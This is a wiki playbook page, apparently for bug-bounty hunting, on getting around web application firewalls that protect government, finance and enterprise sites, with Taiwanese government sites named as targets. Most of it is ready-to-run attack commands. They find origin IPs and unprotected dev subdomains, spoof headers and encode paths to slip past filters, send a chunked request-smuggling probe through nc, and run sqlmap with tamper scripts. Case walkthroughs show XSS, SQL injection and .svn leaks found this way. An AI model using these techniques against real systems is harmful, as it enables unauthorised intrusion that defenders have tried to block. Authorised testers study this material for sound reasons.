---
type: wiki
category: playbook
status: active
last-updated: 2026-04-21
---

# WAF / Firewall Bypass Playbook

> Applicable scenarios: government sites, finance, telecom, large enterprises — scanning directly will get blocked by a WAF (Cloudflare / Akamai / Imperva / F5 BIG-IP / AWS WAF / domestic WAFs).
> Core principle: **don't touch the WAF, or go around it — don't try to force through it**.

## 0. Three Golden Rules

1. **Passive first**: anything solvable via Shodan/GitHub/Wayback — never send a request to the target
2. **Low rate**: if active probing is unavoidable, use `-rate-limit 5`, `-c 1`, `sleep 2`
3. **Judge from a single request**: send each payload only once, decide a hit by content-match, don't retry

## 1. WAF Identification

```bash
# wafw00f — the most reliable WAF fingerprinter
pip3 install wafw00f
wafw00f https://target.gov.tw -v

# nuclei waf-detect
nuclei -u https://target -t ~/nuclei-templates/http/technologies/waf-detect.yaml

# manual signature identification
curl -sI https://target.gov.tw | grep -iE "server|via|x-cdn|x-cache|cf-ray|x-sucuri"
# cf-ray → Cloudflare
# Server: AkamaiGHost → Akamai
# X-Sucuri-ID → Sucuri
# X-Iinfo → Imperva Incapsula
```

## 2. Six Bypass Strategies

### Strategy 1: Find the Origin IP (most useful)

**Principle:** A WAF usually sits in front; the real backend is directly exposed on the internet — nobody just knows the IP.

| Method | Tool / Command |
|------|-----------|
| Reverse lookup via certificate transparency logs | `crt.sh?q=%25.target.gov.tw` + Censys `parsed.names: target` |
| Shodan cert hash | `shodan search ssl.cert.fingerprint:XXX` |
| Shodan favicon hash | `shodan search http.favicon.hash:-XXXXX` |
| Censys certificate | `censys search "parsed.subject.common_name: target.gov.tw"` |
| SecurityTrails historical A records | find the IP from before the WAF was put in place |
| DNS history | `viewdns.info/iphistory/` |
| Raw email headers | many systems' outgoing email Received headers leak internal IPs |
| Subdomain bypass | main site has a WAF, but `dev.target` / `mail.target` / `cpanel.target` doesn't |

**Verifying the origin IP:**
```bash
# Once you have a candidate IP, test it directly
curl -sk -H "Host: target.gov.tw" https://1.2.3.4/ | head -30

# If the response is the target site's content → bingo
```

### Strategy 2: Non-standard ports

WAFs often only protect 80/443. Try these ports:

```bash
# rustscan one-shot
rustscan -a target.gov.tw --ulimit 5000 -- -sV | tee ports.txt

# Ports of interest:
# 7001 (WebLogic), 8080, 8443, 8888 (Tomcat Manager / common alt HTTP)
# 8161 (ActiveMQ Admin), 9000 (PHP-FPM / SonarQube), 9200 (ES)
# 9090 (Prometheus), 9100 (Node Exporter), 9092 (Kafka)
# 5432 (Postgres), 3306 (MySQL), 6379 (Redis), 27017 (Mongo)
# 2375 (Docker API unauth), 10250 (kubelet)
```

### Strategy 3: Find staging / dev / uat subdomains

These usually **have no WAF**:

```bash
# Keywords: dev / uat / test / stage / beta / demo / sandbox / qa / pre / preprod
subfinder -d target.gov.tw -silent | grep -iE "dev|uat|test|stage|beta|demo|sandbox|qa|pre|preprod|internal|private|admin|old" > non_prod.txt

# Hunt these separately
bbflow hunt --list non_prod.txt --name target-nonprod --probe
```

**Field experience**: 70% of vulnerabilities in government programs are found here.

### Strategy 4: Vendors / outsourced developers

Government sites are usually outsourced to 2-3 vendors. One bug affects every one of their clients:

```bash
# Google search:
site:xxx.gov.tw "Powered by" / "Designed by" / "Developed by"
site:gov.tw "Powered by [vendor name]"

# Common Taiwanese vendors: Ruei-Yang Information, Linkwell Technology, CSSI (Chunghwa System Integration),
# HualingTech, Chunghwa Telecom, Ares Information, Advantech, Ragic
```

After finding the vendor:
1. Look up the vendor's other clients (running the same CMS)
2. Find one client instance without a WAF
3. Verify the vulnerability there
4. Apply it to the WAF-protected client (bypass)

### Strategy 5: Historical versions / backups

```bash
# Wayback Machine — find the version from before the WAF was installed
bbflow hunt example.com --only crawl-chain   # automatically pulls in gau + wayback

# Or manually:
gau target.gov.tw | uro | grep -E "admin|login|api|config|upload" > old_endpoints.txt

# Some endpoints exist in an old version but were "removed" in the new one while still actually live
```

### Strategy 6: HTTP-layer tricks

```bash
# Case variation — many WAFs are case-sensitive
curl 'https://target/APi/users'
curl 'https://target/API/users'

# HTTP method switching
curl -X OPTIONS https://target/api/users    # check the Allow header
curl -X PATCH https://target/api/users/1    # WAF may only filter GET/POST
curl -X TRACE https://target/                # can reflect when enabled

# Header injection (many WAFs don't check CR/LF injection)
curl -H "X-Original-URL: /admin" https://target/
curl -H "X-Rewrite-URL: /admin" https://target/
curl -H "X-Forwarded-For: 127.0.0.1" https://target/admin
curl -H "X-Real-IP: 127.0.0.1" https://target/admin
curl -H "Host: admin.target" https://target/
curl -H "X-Original-Host: admin.target" https://target/

# Path encoding (some WAFs don't decode before matching)
curl 'https://target/%2e%2e/admin'
curl 'https://target/admin%00'
curl 'https://target/admin%09'    # tab
curl 'https://target/admin;'      # semicolon
curl 'https://target//admin'      # double slash
curl 'https://target/admin#/'     # fragment

# HTTP/2 / HTTP/3 switching (old WAFs only look at HTTP/1.1)
curl --http2 https://target/
curl --http3 https://target/       # if the server supports QUIC

# Chunked encoding (smuggling to bypass WAF normalization)
printf 'POST / HTTP/1.1\r\nHost: target\r\nTransfer-Encoding: chunked\r\n\r\n5\r\nhello\r\n0\r\n\r\n' | nc target 80
```

## 3. Per-Vendor WAF Notes

### Cloudflare
- The `cf-ray` header is the fingerprint
- The `/cdn-cgi/` path is a CF signature
- Common origin IP leak points: mail server, FTP, SSH, dev subdomain
- Bypass: the `__cf_bm` cookie can be reused for 30 minutes

### Akamai
- `AkamaiGHost` in the Server header
- Aggressive blocking: a single regex match triggers a 403
- Bypass: split payloads across params, vary path encoding

### Imperva Incapsula
- `X-Iinfo` header + `visid_incap_*` cookie
- Distinctive feature: JS challenge
- Bypass: connect directly to the origin IP — Incapsula only protects DNS; the backend is often exposed

### AWS WAF
- Rules: rate-based + managed rules
- Bypass: look for AWS CloudFront signatures (`X-Amz-Cf-Id`) → find the S3 bucket / Lambda origin

### Domestic WAFs (e.g. SafeLine, various local vendors)
- SafeLine: `x-waf: SafeLine-CE` or `waf.chaitin`
- Bypass: many government cases put the WAF only at the edge, with the internal IP unprotected

## 4. Real-World Case Templates

### Case A: Cloudflare blocking XSS testing
```
1. wafw00f confirms Cloudflare
2. crt.sh pulls all subdomains
3. `dig A` each subdomain, look for ones not pointing to a Cloudflare IP
4. Found `old-portal.target.gov.tw → 61.x.x.x` (real IP)
5. Ran the XSS test against old-portal — no WAF, succeeded
6. Confirmed the same parameter also exists on the main site
7. In the report, prove the XSS also affects the main site (the main-site XSS payload gets blocked by CF with a 403, but you can use Burp Intercept to hit the origin IP directly)
```

### Case B: Government site fully blocking Nuclei
```
1. nuclei scan gets banned after 10 requests
2. Change strategy: config-leak hunter (1 request per path)
3. Found /.svn/wc.db returning 200 OK + SQLite magic bytes
4. Downloaded wc.db → read with sqlite3 → retrieved the internal repo URL
5. Report: low-risk .svn leak (usually accepted by government programs)
```

### Case C: Akamai blocking SQLi testing
```
1. sqlmap gets blocked, every payload returns a 403
2. Change strategy: passive discovery
   - Pull historical URLs with gau: gau target.gov.tw | grep "?" | uro > params.txt
   - Use gf sqli < params.txt → candidate SQLi points
3. Manually test one by one in Burp, sending each payload only once
4. Found `id=1 AND 1=1` vs `id=1 AND 1=2` return different responses
5. Used `sqlmap --proxy http://burp:8080 --tamper=between,randomcase --delay=3 -r req.txt`
```

## 5. Checklist

- [ ] Identify the WAF with wafw00f first
- [ ] Find the origin IP (crt.sh + Shodan + Censys)
- [ ] List all subdomains and classify them (prod / non-prod)
- [ ] Attack non-prod directly (usually no WAF)
- [ ] Only send low-noise hunters against prod (config-leak / backup-files / weak-login)
- [ ] Find the vendor, find that vendor's other clients
- [ ] Use wayback to pull historical URLs, find removed endpoints
- [ ] Non-standard port scan (rustscan + nmap)
- [ ] Manual testing via Burp Repeater, not Intruder

## Related Documents

- [00-bbflow-complete-flow.md](00-bbflow-complete-flow.md)
- [02-gov-site-quick-wins.md](02-gov-site-quick-wins.md)
- [13-hunter-crawl-chain.md](13-hunter-crawl-chain.md)
- [22-tool-subfinder-httpx.md](22-tool-subfinder-httpx.md)
